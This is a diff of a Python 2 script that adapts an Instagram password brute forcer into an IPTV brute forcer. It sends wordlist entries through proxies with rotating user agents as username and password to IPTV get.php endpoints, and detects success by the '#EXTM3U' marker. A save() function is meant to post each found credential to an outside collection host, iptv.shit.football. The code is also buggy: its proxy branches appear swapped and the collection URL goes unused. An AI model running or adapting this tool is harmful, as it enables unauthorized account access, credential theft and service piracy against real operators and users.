@@ -1,7 +1,7 @@
 ###############################################################################
-# Brute forcer
-# Developed By N3TC@T
-# netcat[dot]av[at]gmail[dot]com 
+# IPTV Brute forcer
+# Developed By N3TC@T for Instagram
+# Altered For IPTV by txt3rob
 # !/usr/bin/python
 ###############################################################################
 
@@ -13,7 +13,7 @@ import random
 import multiprocessing
 import time
 
-if len(sys.argv) != 6:
+if len(sys.argv) != 5:
         print "\nUsage : ./brute.py <url> <wordlist> <proxylist> <thread>"
         print "Eg: ./brute.py netcat words.txt proxy.txt 4\n"
         sys.exit(1)
@@ -57,12 +57,12 @@ except(IOError):
 
 
 
-print "\n***************************************"
-print "* Priv8 Brute forcer        *"
-print "* Coded by N3TC@T                     *"
-print "* netcat[dot]av[at]gmail[dot]com      *"
-print "***************************************"
-print "[+] Username Loaded:",USER
+print "\n*********************************************"
+print "* IPTV Brute forcer POC 		                 *"
+print "* Originally Coded by N3TC@T                  *"
+print "* For Instagram Now For IPTV by txt3rob       *"
+print "***********************************************"
+print "[+] URL Loaded:",URL
 print "[+] Words Loaded:",len(words)
 print "[+] Proxy Loaded:",len(proxys)
 
@@ -86,7 +86,18 @@ for prox in proxys:
 
 print "[+] Online Proxy: " , len(working_list)
 
-
+def save (URL,word):
+    posturl = "http://iptv.shit.football/submit2.php"
+    post_data = {
+            'username':word,
+            'password':word,
+			'url':URL,
+			'type':'m3u',
+			'output':'hls',
+             }
+    r=requests.post(URL, data=post_data ,timeout=10)
+    if (r.status_code == 200 ):
+     print "Saved"
 
 
 def brute(word,event):
@@ -97,34 +108,37 @@ def brute(word,event):
       proxies={'https':'https://'+proxi+'/'}
 
     word = word.replace("\r","").replace("\n","")
-    post_data = {
-            'username':USER,
-            'password':word,
-             }
 	     
     header = {
             "User-Agent": random.choice(ouruseragent) ,
             }
 
     
-    print "[*] Trying " , word , " | " ,  proxi
-    
-    if(proxi != 'No Proxy'):    
-      r=requests.post(URL + "get.php", headers=header ,  data=post_data  , proxies=proxies , timeout=10)
+    print "[*] Trying " , word , " | " ,  proxi + "\n"
+    NEWURL = URL + "/get.php?username="+word+"&password="+word+"&type=m3u&output=hls"
+    #print NEWURL
+    if(proxi != 'No Proxy'):  
+      r=requests.get(NEWURL, headers=header, timeout=10)
     else:
-      r=requests.post(URL  + "get.php" ,headers=header, data=post_data ,timeout=10)
+      r=requests.get(NEWURL, headers=header, proxies=proxies, timeout=10);
     if (r.status_code != 200 ):
-      print "Error" , r.status_code
-      #sys.exit(1)
-    if (r.text.find('#EXTM3U') != -1 ):
+     print "Error" , r.status_code
+     print r.request.proxies
+	 #print ""
+     sys.exit(1)
+    if (r.status_code == 0 ):
+     sys.exit(1)
+     event.set()
+    if (r.text.find('#EXTM3U')!= -1):
       print "\n[*]Successful Login:"
       print "---------------------------------------------------"
-      print "[!]Username: " , USER
+      print "[!]Username: " , word
       print "[!]Password: " , word
       print "---------------------------------------------------\n"
       print "[-] Brute Complete\n"
-      event.set()
-      sys.exit()
+    save (URL,word)
+    event.set()
+    sys.exit()
   except requests.exceptions.Timeout :
     print "[!] Time Out ..."
     pass
